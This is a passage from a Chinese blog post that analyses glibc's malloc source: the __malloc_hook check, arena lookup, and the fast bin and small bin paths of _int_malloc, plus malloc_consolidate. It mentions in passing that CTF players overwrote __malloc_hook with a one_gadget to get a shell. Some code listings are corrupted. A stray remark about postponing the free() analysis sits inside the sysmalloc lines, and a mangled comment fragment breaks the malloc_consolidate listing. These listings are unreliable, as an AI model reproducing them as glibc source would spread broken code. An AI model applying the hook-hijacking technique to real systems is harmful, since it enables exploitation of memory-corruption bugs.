class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>定义了一个<code>hook</code>函数指针，如果<code>hook!=NULL</code>则直接调用<code>hook</code>指向的内容。<code>hook</code>是为了方便开发者调试的一个东西，比如我自己写了一个<code>malloc</code>函数想测试它的性能如何，那么我在这里直接让<code>__malloc_hook=my_malloc</code>就可以直接调用我自己写的malloc函数了。但是同时它也是最容易被劫持的，刚开始我们很多题目都是靠写<code>__malloc_hook</code>为一个<code>onegadget</code>，然后调用<code>malloc</code>去<code>getshell</code>的。在<code>2.34</code>版本中，<code>__malloc_hook</code>同其它大部分的<code>hook</code>都被删除了。</p><p>第二段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arena_get (ar_ptr, bytes);</span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>通过<code>arena_get</code>获得一个分配区，<code>arena_get</code>是个宏定义，定义在<code>arena.c</code>中，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line"><span class="meta">      arena_lookup (ptr);                           \</span></span><br><span class="line"><span class="meta">      arena_lock (ptr, size);                         \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p><code>arena_lookup</code>定义如下，也是获取分配器指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lookup(ptr) do &#123; \</span></span><br><span class="line"><span class="meta">      void *vptr = NULL;                              \</span></span><br><span class="line"><span class="meta">      ptr = (mstate) tsd_getspecific (arena_key, vptr);             \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>然后加锁，没了，获取分配器指针这一段不是我们主要要分析的，也就不过多去解析了。</p><p>第三段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br></pre></td></tr></table></figure><p>它本身注释也写清楚了，在能够找到一个可用的<code>arena</code>之前尝试寻找另外一个<code>arena</code>，我这英文比较飘还请亲见谅。如果<code>arena</code>找到了但是<code>_int_malloc</code>居然返回0了，那么就重新寻找另一个分配器再次调用一次<code>_int_malloc</code>。完了之后呢，要给<code>arena</code>解锁，然后返回得到的<code>chunk</code>指针。</p><h3 id="int-malloc源码分析"><a href="#int-malloc源码分析" class="headerlink" title="_int_malloc源码分析"></a>_int_malloc源码分析</h3><p>由于比较长，为了摆脱水长度的嫌疑就不给看总代码了，需要的自己找<code>glibc</code>的源码就好了，下面我一段一段分析。</p><h3 id="第一段：main-arena初始化"><a href="#第一段：main-arena初始化" class="headerlink" title="第一段：main_arena初始化"></a>第一段：main_arena初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line"><span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;  </span><br><span class="line">checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc (nb, av);<span class="built_in">free</span>的源码分析先咕一会，主要是吧，熬夜写这玩意受不了。。</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量定义就不用看了，源码中也都标注出来了，这里最主要就是把用户请求的<code>bytes</code>转换成最小能满足的<code>chunk size</code>，然后它的变量名应该是<code>nb</code>，这个<code>nb</code>应该是<code>nbytes</code>的缩写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> checked_request2size(req, sz)                             \</span></span><br><span class="line"><span class="meta">  <span class="meta-keyword">if</span> (REQUEST_OUT_OF_RANGE (req)) &#123;                          \</span></span><br><span class="line"><span class="meta">      __set_errno (ENOMEM);                              \</span></span><br><span class="line"><span class="meta">      return 0;                                      \</span></span><br><span class="line"><span class="meta">    &#125;                                          \</span></span><br><span class="line"><span class="meta">  (sz) = request2size (req);</span></span><br></pre></td></tr></table></figure><p>这里原来也给注释了，这俩宏定义就是一样的，只不过做一个参数check。</p><p>这里还要注意一下那些宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__glibc_unlikely(<span class="built_in">exp</span>)表示<span class="built_in">exp</span>很可能为假。</span><br><span class="line">__glibc_likely(<span class="built_in">exp</span>)表示<span class="built_in">exp</span>很可能为真。</span><br><span class="line">__builtin_expect(<span class="built_in">exp</span>,value)表示<span class="built_in">exp</span>==value大概率成立</span><br></pre></td></tr></table></figure><p>这三个宏定义在源码中经常能看到，其实它不会改编程序逻辑，只是告诉编译器这个很可能为某个值，就把否的情况作为跳转，真的情况就顺序运行下去，减少程序的跳转，一定程度上可以优化程序运行速度。或者还有一个简单粗暴的办法，你把这三个字符全都去了，不影响代码逻辑。</p><p>那么这一段的逻辑就是，如果在分配的时候<code>arena</code>为空，那就调用<code>sys_malloc</code>系统调用去请求一个<code>chunk</code>，然后<code>memset</code>这个<code>chunk</code>的数据段。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ------------------ Testing support ----------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> perturb_byte;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">alloc_perturb</span> <span class="params">(<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte ^ <span class="number">0xff</span>, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常情况下<code>perturb_byte</code>为假，差不多意思就是如果你没有特殊设置，那么<code>data</code>段全为0字节，实际情况也确实是这样的。</p><h3 id="第二段：fast-bin的处理"><a href="#第二段：fast-bin的处理" class="headerlink" title="第二段：fast bin的处理"></a>第二段：fast bin的处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get_max_fast() global_max_fast</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">           != victim);</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">//在malloc的时候检查了fastbin的size发现不对</span></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里嘛就会判断，你申请的这个<code>nb</code>是否<code>&lt;=global_max_fast</code>，如果成立那么就会先在<code>fast bin</code>中寻找能满足的<code>chunk</code>，并且一定是完全匹配。它先找到<code>av-&gt;fastbinY[idx]</code>观察是否为0，如果不为0则说明该<code>size</code>的<code>fast bin</code>有<code>chunk</code>，那么就做以下动作：</p><p>取出<code>av-&gt;fastbinY[idx]</code>给<code>victim</code></p><p>链表中删除这个<code>victim</code>，然后重新接回去。</p><p>中间有一个<code>check</code>，就是判断所给<code>chunk</code>的<code>fastbinY</code>链上的<code>size</code>是否＝我需要的<code>size</code>，如果不相等那么直接报错退出。</p><p>末尾也有一个<code>check</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Properties of chunks recycled from fastbins</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">do_check_remalloced_chunk</span> <span class="params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));</span><br><span class="line">      <span class="keyword">if</span> (chunk_non_main_arena (p))</span><br><span class="line">        assert (av != &amp;main_arena);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av == &amp;main_arena);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz) &gt;= MINSIZE);</span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));</span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s) &gt;= <span class="number">0</span>);</span><br><span class="line">  assert ((<span class="keyword">long</span>) (sz) - (<span class="keyword">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是<code>check</code>各个标志位，一般不会被触发，所以可以理解为<code>fast bin</code>在分配的时候只有这一个<code>check</code>，就是那个<code>chunk</code>的<code>size</code>一定是等于我申请的<code>size</code>的，过了就把这个<code>chunk</code>的指针返回，<code>check</code>没过报错，如果根本都没取到<code>fast bin</code>，那么就进行下面的逻辑了。</p><h3 id="第三段：small-bin的处理"><a href="#第三段：small-bin的处理" class="headerlink" title="第三段：small bin的处理"></a>第三段：small bin的处理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                  \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先判断它在不在<code>small bin</code>的范围内，然后取出这个<code>size</code>的<code>small bin</code>的最后一个<code>chunk</code>。它添加是在头部添加的，因此是符合先进先出的，嗯。然后需要判断，如果最后一个chunk!=自身的话，两个情况：要么没初始化<code>arena</code>，那就初始化，要么它有一个合法的块。如果它指向自身那就没必要做过多的判断了，没有这个大小的<code>small bin</code>。</p><p>这里是调用了<code>malloc_consolidate</code>函数去初始话这个<code>arena</code>分配器，该函数逻辑如下，不重点解读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span><span class="function">mlined version of consolidation code in <span class="title">free</span><span class="params">()</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    maxfb </span>= &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      check_inuse_chunk(av, p);</span><br><span class="line">      nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">      size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">      nextchunk = chunk_at_offset(p, size);</span><br><span class="line">      nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = p-&gt;prev_size;</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">        unlink(av, p, bck, fwd);</span><br><span class="line">      &#125;</span><br><span 